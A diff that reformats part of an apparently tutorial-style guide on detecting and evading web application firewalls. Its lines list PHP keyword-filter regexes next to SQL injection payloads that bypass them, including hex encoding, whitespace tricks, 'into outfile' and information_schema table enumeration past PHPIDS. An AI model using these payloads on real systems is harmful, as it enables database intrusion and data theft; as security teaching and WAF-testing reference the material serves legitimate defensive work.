@@ -1223,12 +1223,12 @@ Wanna detect WAFs? Lets see how.
 Lets look at some methods of bypassing and evading WAFs.
 
 ### Fuzzing/Bruteforcing:
-- __Method:__
+__Method:__
 Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - Wordlists specifically for fuzzing - [Seclists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
 - Can be done with automated tools like BurpSuite Intruder.
 
-- __Technique:__
+__Technique:__
 - Load up your wordlist into Burp Intruder/custom fuzzer and start the bruteforce.
 - Record/log all responses from the different payloads fuzzed.
 - Use random user-agents, ranging from Chrome Desktop to iPhone browser.
@@ -1240,80 +1240,73 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - Many a times your IP will be blocked (temporarily/permanently).
 
 ### Regex-Reversing:
-- __Method:__
+__Method:__
 - Most efficient method of bypassing WAFs.
 - Some WAFs rely upon matching the attack payloads with the signatures in their databases.
 - Payload matches the reg-ex the WAF triggers alarm.
 
-- __Techniques:__
+__Techniques:__
 
 ##### Step 1:
-Keyword filer: `and`, `or`, `union`
-----
-Possible PHP Filter Code: `preg_match('/(and|or|union)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`  
+__Possible PHP Filter Code__: `preg_match('/(and|or|union)/i', $id)`
 - __Filtered Injection__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
 ##### Step 2:
-Keyword filer: `and`, `or`, `union`, `where`
-----
-Possible PHP Filter Code: `preg_match('/(and|or|union|where)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`  
+__Possible PHP Filter Code__: `preg_match('/(and|or|union|where)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`
 
 ##### Step 3:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`
-----
-Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`  
+__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 
 ##### Step 4:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`
-----
-Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`  
+__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
 
 ##### Step 5:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`
-----
-Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
+__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select)/i', $id)`
 - __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`
 
 ##### Step 6:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`
-----
-Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
+__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`
 - __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || user_id is not null`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
 - __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`
 
 ##### Step 7:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`
-----
-Possible Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
+Possible __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)`
 - __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
 - __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 
 ##### Step 8:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`
-----
-Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
+__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)`
 - __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 - __Bypassed Injection__: `1 || lpad(user,7,1)`
 
 ##### Step 9:
-Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`
-----
-Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
+__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
+__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
 - __Filtered Injection__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
 
-PHPIDS generally blocks input containing = or ( or ' following with any a string or integer e.g. 1 or 1=1, 1 or '1', 1 or char(97). However, it can be bypassed using a statement that does not contain =, ( or ' symbols. 
+---
+
+__PHP-IDS__ generally blocks input containing `=` or `(` or `'` following with any a string or integer e.g. `1 or 1=1`, `1 or '1'`, `1 or char(97)`. However, it can be bypassed using a statement that does not contain `=`, `(` or `'` symbols. 
 
 #### Scenario 1:
 - __Filtered Injection__: `1 or 1 = 1`
@@ -1326,11 +1319,10 @@ PHPIDS generally blocks input containing = or ( or ' following with any a string
 - __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a`
 - __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273`
 
-- __Drawbacks:__
+__Drawbacks:__
 - This method is time consuming.
 
 ## Google Dorks Approach:
-- 
 
 ## Awesome Tools
 ### WAF Fingerprinting:
